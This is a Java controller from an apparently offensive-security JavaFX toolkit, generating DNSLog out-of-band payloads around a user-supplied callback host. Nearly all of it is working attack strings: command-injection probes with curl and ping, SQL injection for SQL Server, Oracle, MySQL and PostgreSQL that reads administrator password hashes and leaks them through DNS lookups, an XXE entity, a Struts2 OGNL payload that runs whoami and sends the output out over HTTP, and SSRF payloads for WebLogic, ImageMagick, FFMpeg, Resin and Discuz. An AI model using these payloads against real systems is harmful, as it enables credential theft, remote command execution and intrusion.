package com.sec421.controller.baseTools;
/**
 * @author 0x421
 * @date 2023/12/28 11:20
 * @github https://github.com/0x7eTeam
 */
import javafx.scene.control.TextArea;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;

public class DNSLogerController {
    public void RCEGenerate(TextArea textArea, String text){
        String temp = "Liunx/Unix/Mac OS系统:\n" +
                "\n" +
                "curl http://"+text+"/`whoami`\n" +
                "ping `whoami`.1cbschv4.dnslog.pw\n" +
                "\n" +
                "Windows系统:\n" +
                "\n" +
                "ping %USERNAME%."+text+"";
        textArea.setText(temp);
    }
    public void SQLGenerate(TextArea textArea, String text){
        String temp = "SQL Server数据库:\n" +
                "\n" +
                "DECLARE @host varchar(1024);\n" +
                "SELECT @host=(SELECT TOP 1\n" +
                "master.dbo.fn_varbintohexstr(password_hash)\n" +
                "FROM sys.sql_logins WHERE name='sa')\n" +
                "+'."+text+"';\n" +
                "EXEC('master..xp_dirtree\n" +
                "\"\\\\'+@host+'\\foobar$\"');\n" +
                "\n" +
                "Oracle数据库:\n" +
                "\n" +
                "SELECT UTL_INADDR.GET_HOST_ADDRESS('"+text+"');\n" +
                "SELECT UTL_HTTP.REQUEST('http://"+text+"/oracle') FROM DUAL;\n" +
                "SELECT HTTPURITYPE('http://"+text+"/oracle').GETCLOB() FROM DUAL;\n" +
                "SELECT DBMS_LDAP.INIT(('oracle."+text+"',80) FROM DUAL;\n" +
                "SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'."+text+"',80) FROM DUAL;\n" +
                "\n" +
                "MySQL数据库:\n" +
                "\n" +
                "SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql."+text+"\\\\abc'));\n" +
                "\n" +
                "PostgreSQL数据库:\n" +
                "\n" +
                "DROP TABLE IF EXISTS table_output;\n" +
                "CREATE TABLE table_output(content text);\n" +
                "CREATE OR REPLACE FUNCTION temp_function()\n" +
                "RETURNS VOID AS $\n" +
                "DECLARE exec_cmd TEXT;\n" +
                "DECLARE query_result TEXT;\n" +
                "BEGIN\n" +
                "SELECT INTO query_result (SELECT passwd\n" +
                "FROM pg_shadow WHERE usename='postgres');\n" +
                "exec_cmd := E'COPY table_output(content)\n" +
                "FROM E\\'\\\\\\\\\\\\\\\\'||query_result||E'.psql."+text+"\\\\\\\\foobar.txt\\'';\n" +
                "EXECUTE exec_cmd;\n" +
                "END;\n" +
                "$ LANGUAGE plpgsql SECURITY DEFINER;\n" +
                "SELECT temp_function();";
        textArea.setText(temp);
    }
    public  void XXEGenerate(TextArea textArea, String text){
        String temp = "XML实体:\n" +
                "\n" +
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE root [\n" +
                "<!ENTITY % remote SYSTEM \"http://"+text+"/xxe_test\">\n" +
                "%remote;]>\n" +
                "<root/>";
        textArea.setText(temp);
    }
    public  void OTHERGenerate(TextArea textArea, String text){
        String temp = "Struts2中间件:\n" +
                "\n" +
                "xx.action?redirect:http://"+text+"/%25{3*4}\n" +
                "xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d\"http://"+text+"/result%3d\".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(\"GET\"),%23http.connect(),%23http.getInputStream()}\n" +
                "\n" +
                "FFMpeg插件:\n" +
                "\n" +
                "#EXTM3U\n" +
                "#EXT-X-MEDIA-SEQUENCE:0\n" +
                "#EXTINF:10.0,\n" +
                "concat:http://"+text+"\n" +
                "#EXT-X-ENDLIST\n" +
                "\n" +
                "Weblogic中间件:\n" +
                "\n" +
                "example.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://"+text+"/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search\n" +
                "\n" +
                "ImageMagick插件:\n" +
                "\n" +
                "push graphic-context\n" +
                "viewbox 0 0 640 480\n" +
                "fill 'url(http://"+text+")'\n" +
                "pop graphic-context\n" +
                "\n" +
                "Resin中间件:\n" +
                "\n" +
                "example.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://"+text+"/ssrf\n" +
                "\n" +
                "Discuz社群:\n" +
                "\n" +
                "example.com/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://"+text+"/x.jpg[/img]&formhash=x";
        textArea.setText(temp);
    }

}
